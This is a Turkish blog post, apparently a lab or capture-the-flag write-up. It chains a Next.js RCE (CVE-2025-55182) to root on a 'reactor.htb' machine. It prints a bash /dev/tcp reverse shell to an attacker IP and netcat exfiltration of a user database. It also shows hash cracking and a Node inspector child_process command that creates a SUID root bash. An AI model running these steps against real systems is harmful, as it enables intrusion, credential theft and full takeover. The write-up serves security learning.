---

title: "Next.js RCE'den Root'a: CVE-2025-55182 (React2Shell) ve Node.js Inspector Üzerinden Privilege Escalation"
date: 2026-07-17 14:00:00 +0300
categories: [Web Security]
tags: [pentest, nextjs, cve-2025-55182, rce, react2shell, prototype-pollution, node-inspector, privilege-escalation, linux]

---


Hedef sisteme ilk temas kurduğumda, nmap ile kapsamlı bir tarama yaptım:

```sh
nmap 10.129.47.118 -p- -Pn -sC -sV --open -T4 -oN ports.txt

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
```

Bu tarama sayesinde `22` numaralı SSH portu ve özellikle **`3000`** numaralı porta odaklandım. 3000 portunda `Next.js 15.0.3` tabanlı bir web uygulaması çalışıyordu. Bu versiyonun bilinen bir güvenlik açığı olduğunu fark ettim:

![Açıklama](/assets/img/20260717232213.png)

Araştırmam sonucunda **CVE-2025-55182** (React Server Components’teki Prototype Pollution zafiyeti üzerinden RCE `(Reat2shell)` ) exploit’ini buldum. Bu zafiyet, Next.js’in Flight Protocol’ünü kötüye kullanarak sunucu tarafında kod çalıştırmaya izin veriyordu. Direkt shell almak için hazır PoC’u tercih ettim:

```sh
┌──(kali㉿kali)-[~/Desktop/reactor]
└─$ git clone https://github.com/p3ta00/react2shell-poc.git                
Cloning into 'react2shell-poc'...
remote: Enumerating objects: 22, done.
remote: Counting objects: 100% (22/22), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 22 (delta 6), reused 22 (delta 6), pack-reused 0 (from 0)
Receiving objects: 100% (22/22), 13.54 KiB | 13.54 MiB/s, done.
Resolving deltas: 100% (6/6), done.


┌──(kali㉿kali)-[~/Desktop/reactor]
└─$ cd react2shell-poc 

┌──(kali㉿kali)-[~/Desktop/reactor/react2shell-poc]
└─$ python3 react2shell-poc.py -t http://10.129.245.214:3000 --revshell --lhost 10.10.14.177 --lport 4444


 ██████╗ ███████╗ █████╗  ██████╗████████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗
 ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝╚════██╗██╔════╝██║  ██║██╔════╝██║     ██║
 ██████╔╝█████╗  ███████║██║        ██║    █████╔╝███████╗███████║█████╗  ██║     ██║
 ██╔══██╗██╔══╝  ██╔══██║██║        ██║   ██╔═══╝ ╚════██║██╔══██║██╔══╝  ██║     ██║
 ██║  ██║███████╗██║  ██║╚██████╗   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
═══════════════════════════════════════════════════════════════════════════════════════
    CVE-2025-55182 - React Server Components RCE
    Prototype Pollution → Flight Protocol → RCE
    For authorized security testing only

[*] Checking target: http://10.129.245.214:3000
[+] Target is running Next.js
[+] Next.js application detected
[!] Could not confirm vulnerability status - proceeding anyway
[!] Attempting reverse shell to 10.10.14.177:4444
[!] Ensure your listener is running!
[*] Trying shell payload 1/4...
[*] Target: http://10.129.245.214:3000
[*] Command: bash -c 'bash -i >& /dev/tcp/10.10.14.177/4444 0>&1'
[*] Payload size: 296 bytes
[*] Sending malicious Flight payload...
[+] Payload delivered via multipart to http://10.129.245.214:3000
[+] Reverse shell payload sent!
[*] Check your listener for incoming connection
```

Penelope listener’ı başlattım:

```sh
python3 penelope.py -p 4444
```

Bu sayede **`node`** kullanıcısı olarak reverse shell aldım. 

Shell’de ilk işim etrafı incelemek oldu:

```sh
node@reactor:/opt/reactor-app$ ls
app  next.config.js  node_modules  package.json  package-lock.json  reactor.db

node@reactor:/opt/reactor-app$ whoami
node
```

Burada bir database dosyası dikkatimi çekti. Bu dosyanın içinde muhtemel kullanıcı bilgileri olabileceğini düşündüm. Dosyayı kendi makinemize aktarmak için netcat ile basit bir transfer yaptım:

```sh
# Attacker tarafı
nc -lvnp 4545 > dbfile.db

# Hedef tarafı
node@target:/opt/app$ nc 10.10.14.177 4545 < /opt/app/[db-dosyası]
```

Veritabanını `sqlite3` ile inceledim:

```sh
┌──(kali㉿kali)-[~/Desktop/reactor/react2shell-poc]
└─$ file reactor.db  
reactor.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 7, database pages 3, cookie 0x2, schema 4, UTF-8, version-valid-for 7

┌──(kali㉿kali)-[~/Desktop/reactor/react2shell-poc]
└─$ sqlite3 reactor.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.

sqlite> .tables
sensor_logs  users      

sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

İki kullanıcı ve hash’leri çıktı. Engineer kullanıcısının hash’ini crackstation ile crack ettim. Bu hash’i kırmak, sistemde daha yüksek yetkiye sahip bir kullanıcıya geçiş için kritik öneme sahipti. Hash kırıldıktan sonra engineer user'ı ile devam ettim:

```sh
node@target:/opt/app$ su engineer
Password: ********
```

Artık **engineer** kullanıcısı olarak devam ediyordum. Bu pivot, daha fazla dosya ve servis erişimi sağladı.

Sonraki adımda sistemi derinlemesine taramak için `linpeas.sh`’ı çalıştırdım:

```sh
# Attacker makina
─(kali㉿kali)-[~/Desktop/Tools]
└─$ python3 -m http.server                                                                               
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.245.214 - - [13/Jul/2026 07:28:08] "GET /linpeas.sh HTTP/1.1" 200 -
10.129.245.214 - - [13/Jul/2026 07:29:12] "GET /linpeas.sh HTTP/1.1" 200 -

# Victim makina
engineer@target:~$ wget http://10.10.14.177:8000/linpeas.sh -O lin.sh
engineer@reactor:~$ chmod +x lin.sh
engineer@reactor:~$ ./lin.sh
```

```sh
engineer@reactor:~$ ss -lntp
State                       Recv-Q                      Send-Q                                           Local Address:Port                                             Peer Address:Port                      Process                      
LISTEN                      0                           511                                                  127.0.0.1:9229                                                  0.0.0.0:*                                                      
LISTEN                      0                           4096                                                127.0.0.54:53                                                    0.0.0.0:*                                                      
LISTEN                      0                           4096                                             127.0.0.53%lo:53                                                    0.0.0.0:*                                                      
LISTEN                      0                           4096                                                   0.0.0.0:22                                                    0.0.0.0:*                                                      
LISTEN                      0                           4096                                                      [::]:22                                                       [::]:*                                                      
LISTEN                      512                         511                                                          *:3000                                                        *:*                                                      
engineer@reactor:~$ 

```



`Linpeas` çıktısında ve `ps aux | grep node` komutunda çok önemli bir detay yakaladım: **`127.0.0.1:9229`** portunda Node.js V8 Inspector servisi çalışıyordu ve bu servis **`root`** yetkisiyle bir `worker.js` dosyasını yönetiyordu. Bu port dışarıdan değil, sadece localhost’tan erişilebilir durumdaydı.

```sh
engineer@reactor:~$ ps aux | grep node
node        1392  0.0  2.3 11809708 94368 ?      Ssl  06:38   0:01 next-server (v15.0.3)
root        1394  0.0  1.2 1066444 48156 ?       Ssl  06:38   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
node        1708  0.0  0.0   2800  1804 ?        S    07:20   0:00 /bin/sh -c bash -c 'bash -i >& /dev/tcp/10.10.14.177/4444 0>&1'
node        1709  0.0  0.0   7340  3816 ?        S    07:20   0:00 bash -c bash -i >& /dev/tcp/10.10.14.177/4444 0>&1
node        1710  0.0  0.0   7340  3864 ?        S    07:20   0:00 /usr/bin/bash
node        1744  0.0  0.3  20392 13052 ?        S    07:20   0:00 /usr/bin/python3 -Wignore -c import 
```

Bu yüzden SSH port forwarding ile yerel porta tünel oluşturdum:

```sh
ssh -L 9229:127.0.0.1:9229 engineer@10.129.245.214
```
- Bu zorunlu değildi ama ben yaptım.

Artık kendi makinemden `9229` portuna erişebiliyordum. Inspector’a bağlanıp komut çalıştırmak için node debug modunu kullandım:


```
engineer@reactor:~$ curl http://127.0.0.1:9229/json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/61c968ee-d2ff-41ea-9701-3c0a7e577a01",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/61c968ee-d2ff-41ea-9701-3c0a7e577a01",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "61c968ee-d2ff-41ea-9701-3c0a7e577a01",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/61c968ee-d2ff-41ea-9701-3c0a7e577a01"
} ]
```
- Hedef makinede **9229** portunda Node.js debug/inspector servisi aktif.
- Bu servis, **`/opt/uptime-monitor/worker.js`** dosyasını çalıştırıyor.
- En kritik nokta: Bu worker.js dosyası **`root`** yetkisiyle çalışıyor.
- webSocketDebuggerUrl ile `debug` bağlantısı yapabileceğimizi gösteriyor.

Normalde dışarıdan erişilemeyen bu debug portu, root yetkisiyle çalışan bir Node.js process'i olduğu için, buradan komut çalıştırarak privilege escalation yapmak mümkün hale geliyor.


Debug konsolunda `child_process` modülünü kullanarak `SUID` root bash oluşturmayı başardım:

```sh
engineer@reactor:~$ node inspect 127.0.0.1:9229
connecting to 127.0.0.1:9229 ... ok

debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')")

Uint8Array(0)
debug> .exit
```
#### Ne yapıldı?

- `process.mainModule.require('child_process')` : Node.js içinde sistem komutları çalıştırabilme modülünü çağırdı.
- `execSync(...)` : Sunucu tarafında şu komutları root yetkisiyle çalıştırdı:
    1. `/bin/bash` dosyasını `/tmp/rootbash` olarak kopyaladı.
    2. `chmod +s` ile bu kopyaya **SUID (Set User ID)** bitini ekledi. Yani bu bash dosyası, hangi kullanıcı tarafından çalıştırılırsa çalıştırılsın **`root` yetkisiyle** çalışacak.
- `Uint8Array(0)` → Komutun başarıyla çalıştığını gösterir.

#### Son olarak:

```sh
engineer@reactor:~$ /tmp/rootbash -p

rootbash-5.2# id
uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)

rootbash-5.2# whoami
root

```

Daha önce oluşturduğumuz **SUID root** bash dosyasını `-p` parametresiyle çalıştırdık.

- `-p (privileged)` parametresi, bash’in SUID bitini korumasını ve root yetkileriyle çalışmasını sağlar.

Komutunu çalıştırdığım anda `euid=0(root)` olarak root yetkisine ulaştım.

---

**Özet Hikaye Akışı:** Web uygulamasına Next.js RCE ile girdim → Veritabanından ikinci kullanıcıyı ele geçirdim → Local enumeration ile root çalışan debug servisini keşfettim → Port forwarding ile erişip, Node Inspector üzerinden root shell aldım.